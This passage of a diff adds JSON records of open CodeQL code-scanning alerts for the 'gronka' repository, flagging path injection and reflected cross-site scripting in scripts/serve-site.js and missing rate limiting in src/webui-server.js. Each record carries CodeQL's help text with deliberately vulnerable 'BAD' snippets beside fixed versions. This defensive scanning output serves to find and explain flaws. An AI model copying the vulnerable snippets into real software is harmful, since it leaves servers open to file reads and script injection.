+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 64,
+        "end_line": 64,
+        "start_column": 23,
+        "end_column": 32
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/10/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 9,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/9",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/9",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 62,
+        "end_line": 62,
+        "start_column": 46,
+        "end_column": 54
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/9/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 8,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/8",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/8",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 62,
+        "end_line": 62,
+        "start_column": 21,
+        "end_column": 29
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/8/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 7,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/7",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/7",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 57,
+        "end_line": 57,
+        "start_column": 46,
+        "end_column": 54
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/7/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 6,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/6",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/6",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 57,
+        "end_line": 57,
+        "start_column": 21,
+        "end_column": 29
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/6/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 5,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/5",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/5",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/path-injection",
+      "severity": "error",
+      "description": "Uncontrolled data used in path expression",
+      "name": "js/path-injection",
+      "tags": [
+        "external/cwe/cwe-022",
+        "external/cwe/cwe-023",
+        "external/cwe/cwe-036",
+        "external/cwe/cwe-073",
+        "external/cwe/cwe-099",
+        "security"
+      ],
+      "full_description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
+      "help": "# Uncontrolled data used in path expression\nAccessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nThe validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.\n\nIn the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any \"..\" segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.\n\nIn the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove \"../\" sequences: for example, applying this filter to \".../...//\" would still result in the string \"../\".\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing \"../\" segments to navigate outside the root folder and access sensitive files.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // BAD: This function uses unsanitized input that can read any file on the file system.\n  res.write(fs.readFileSync(ROOT + filePath, 'utf8'));\n});\n```\nThe second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any \"../\" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.\n\n\n```javascript\nconst fs = require('fs'),\n      http = require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This path depends on a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 35,
+        "end_line": 35,
+        "start_column": 15,
+        "end_column": 23
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/5/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 4,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/4",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/4",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/reflected-xss",
+      "severity": "error",
+      "description": "Reflected cross-site scripting",
+      "name": "js/reflected-xss",
+      "tags": ["external/cwe/cwe-079", "external/cwe/cwe-116", "security"],
+      "full_description": "Writing user input directly to an HTTP response allows for a cross-site scripting vulnerability.",
+      "help": "# Reflected cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n  if (!isValidUserId(req.params.id))\n    // BAD: a request parameter is incorporated without validation into the response\n    res.send(\"Unknown user: \" + req.params.id);\n  else\n    // TODO: do something exciting\n    ;\n});\n\n```\nSanitizing the user-controlled data prevents the vulnerability:\n\n\n```javascript\nvar escape = require('escape-html');\n\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n  if (!isValidUserId(req.params.id))\n    // GOOD: request parameter is sanitized before incorporating it into the response\n    res.send(\"Unknown user: \" + escape(req.params.id));\n  else\n    // TODO: do something exciting\n    ;\n});\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "Cross-site scripting vulnerability due to a user-provided value."
+      },
+      "location": {
+        "path": "scripts/serve-site.js",
+        "start_line": 97,
+        "end_line": 103,
+        "start_column": 13,
+        "end_column": 6
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/4/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 3,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
+    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/3",
+    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/3",
+    "state": "open",
+    "fixed_at": null,
+    "dismissed_by": null,
+    "dismissed_at": null,
+    "dismissed_reason": null,
+    "dismissed_comment": null,
+    "rule": {
+      "id": "js/missing-rate-limiting",
+      "severity": "warning",
+      "description": "Missing rate limiting",
+      "name": "js/missing-rate-limiting",
+      "tags": ["external/cwe/cwe-307", "external/cwe/cwe-400", "external/cwe/cwe-770", "security"],
+      "full_description": "An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.",
+      "help": "# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
+      "security_severity_level": "high"
+    },
+    "tool": {
+      "name": "CodeQL",
+      "guid": null,
+      "version": "2.23.5"
+    },
+    "most_recent_instance": {
+      "ref": "refs/heads/main",
+      "analysis_key": ".github/workflows/codeql.yml:analyze",
+      "environment": "{\"language\":\"javascript\"}",
+      "category": "/language:javascript",
+      "state": "open",
+      "commit_sha": "a28cc35ac1c5e0e7378917f4f4e98874426a20ac",
+      "message": {
+        "text": "This route handler performs a file system access, but is not rate-limited."
+      },
+      "location": {
+        "path": "src/webui-server.js",
+        "start_line": 236,
+        "end_line": 243,
+        "start_column": 14,
+        "end_column": 2
+      },
+      "classifications": []
+    },
+    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/3/instances",
+    "dismissal_approved_by": null,
+    "assignees": []
+  },
+  {
+    "number": 2,
+    "created_at": "2025-11-23T18:00:49Z",
+    "updated_at": "2025-11-23T18:00:49Z",
